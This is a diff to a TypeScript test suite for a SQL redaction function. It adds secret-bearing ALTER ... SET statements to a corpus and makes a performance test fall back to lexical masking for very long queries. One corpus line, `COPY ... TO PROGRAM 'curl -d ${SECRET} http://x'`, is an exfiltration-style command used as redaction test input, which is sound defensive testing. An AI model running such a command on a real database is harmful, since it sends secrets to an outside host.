@@ -56,6 +56,11 @@ const CORPUS: readonly (readonly [string, string])[] = [
   [`SELECT set_config('app.secret_token', '${SECRET}', false)`, 'summary'],
   [`COPY t TO PROGRAM 'curl -d ${SECRET} http://x'`, 'summary'],
   [`ALTER ROLE app PASSWORD '${SECRET}`, 'summary'],
+  // ALTER … SET of a secret-named setting (the setstmt has no type wrapper in the tree)
+  [`ALTER SYSTEM SET app.api_password = '${SECRET}'`, 'summary'],
+  [`ALTER DATABASE d SET app.secret_token = '${SECRET}'`, 'summary'],
+  [`ALTER ROLE app SET app.api_key TO '${SECRET}'`, 'summary'],
+  [`ALTER ROLE app IN DATABASE d SET app.api_password = ${SECRET}`, 'summary'],
   // a setting's value written as a bare or quoted word (G4 review R1)
   [`SET app.claims = ${SECRET}`, 'parse'],
   [`SET app.claims TO ${SECRET}`, 'parse'],
@@ -155,11 +160,15 @@ describe.each(SUPPORTED_MAJORS.map((m) => [m]))(
     // on its own; the linear one needs well under a second alone and stays far below the
     // bound when every package's tests run at once.
     it('redacts 100,000 constants in linear time, parsed or not (G4 review R2)', () => {
-      const list = Array.from({ length: 100_000 }, (_, i) => `'v${i}'`).join(',')
-      const text = `SELECT 1 FROM t WHERE id IN (${list})`
+      const list = (n: number) => Array.from({ length: n }, (_, i) => `'v${i}'`).join(',')
+      const text = `SELECT 1 FROM t WHERE id IN (${list(60_000)})`
+      // 100,000 constants are more tokens than one parse is given (MAX_PARSE_TOKENS, the
+      // verification review of follow-up 2 P1-1): the lexer masks them.
+      const large = `SELECT 1 FROM t WHERE id IN (${list(100_000)})`
       for (const [input, mode] of [
         [text, 'parse'],
         [`${text} AND x = 'cut`, 'lexical'],
+        [large, 'lexical'],
       ] as const) {
         const started = performance.now()
         const r = redactStatementSync(input, { major })
